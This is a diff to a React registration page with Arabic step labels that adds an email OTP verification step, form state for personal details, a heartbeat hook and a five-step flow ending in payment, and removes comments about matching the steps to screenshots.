@@ -4,48 +4,46 @@ import { Footer } from "@/components/Footer";
 import { Stepper } from "@/components/Stepper";
 import { Step1AccountType } from "@/components/steps/Step1AccountType";
 import { Step2PersonalData } from "@/components/steps/Step2PersonalData";
+import { StepOtpVerification } from "@/components/steps/StepOtpVerification";
 import { Step3Password } from "@/components/steps/Step3Password";
 import { Step4Payment } from "@/components/steps/Step4Payment";
 import { MessageCircle } from "lucide-react";
+import { useHeartbeat } from "@/hooks/useHeartbeat";
 
 export default function Register() {
-  const [step, setStep] = useState(4);
-  // Labels matching the screenshot:
-  // 1: معلومات البطاقة (Card Info - ID Card)
-  // 2: استمارة التقديم (Application Form)
-  // 3: تفاصيل الدفع (Payment Details - Password setup is usually part of form, but let's map my steps)
-  // My Step 3 is Password. The screenshot has "كلمة المرور" (Password) as a header in one image.
-  // Actually, looking at the "Password" screenshot, the stepper shows:
-  // 4: انتهاء التسجيل (End Registration)
-  // 3: كلمة المرور (Password)
-  // 2: البيانات الشخصية (Personal Data)
-  // 1: نوع الحساب (Account Type)
+  const [step, setStep] = useState(1);
+  const [formData, setFormData] = useState({
+    email: "",
+    fullNameArabic: "",
+    fullNameEnglish: "",
+    phoneNumber: "",
+    dateOfBirth: "",
+    gender: "male",
+    nationality: "qatar",
+    address: {
+      buildingNumber: "",
+      area: "",
+      street: "",
+    }
+  });
 
-  // WAIT. The screenshot `...Password_1765369962019.png` shows:
-  // 4: انتهاء التسجيل
-  // 3: كلمة المرور (Active)
-  // 2: البيانات الشخصية
-  // 1: نوع الحساب
-
-  // The screenshot `...Summary_1765369962018.png` shows:
-  // 4: الدفع الإلكتروني
-  // 3: تفاصيل الدفع
-  // 2: استمارة التقديم
-  // 1: معلومات البطاقة
-
-  // These seem to be two different flows or the screenshot names are confusing.
-  // The "Password" screenshot clearly matches the `Step3Password` content I built.
-  // So I will stick to the labels from the "Password" screenshot as they match the form fields I saw.
+  useHeartbeat("/register");
 
   const steps = [
     "نوع الحساب",
     "البيانات الشخصية",
+    "التحقق من البريد",
     "كلمة المرور",
     "انتهاء التسجيل",
   ];
 
-  const nextStep = () => setStep((prev) => Math.min(prev + 1, 4));
+  const nextStep = () => setStep((prev) => Math.min(prev + 1, 5));
   const prevStep = () => setStep((prev) => Math.max(prev - 1, 1));
+
+  const handlePersonalDataNext = (data: typeof formData) => {
+    setFormData(data);
+    nextStep();
+  };
 
   return (
     <div className="min-h-screen flex flex-col bg-gray-50 font-sans" dir="rtl">
@@ -57,10 +55,21 @@ export default function Register() {
         <div className="bg-gray-100/50 rounded-lg shadow-sm border border-gray-200 overflow-hidden min-h-[600px]">
           {step === 1 && <Step1AccountType onNext={nextStep} />}
           {step === 2 && (
-            <Step2PersonalData onNext={nextStep} onBack={prevStep} />
+            <Step2PersonalData 
+              onNext={handlePersonalDataNext} 
+              onBack={prevStep}
+              initialData={formData}
+            />
           )}
-          {step === 3 && <Step3Password onNext={nextStep} onBack={prevStep} />}
-          {step === 4 && <Step4Payment onNext={nextStep} onBack={prevStep} />}
+          {step === 3 && (
+            <StepOtpVerification
+              email={formData.email}
+              onVerified={nextStep}
+              onBack={prevStep}
+            />
+          )}
+          {step === 4 && <Step3Password onNext={nextStep} onBack={prevStep} />}
+          {step === 5 && <Step4Payment onNext={nextStep} onBack={prevStep} />}
         </div>
       </main>
 
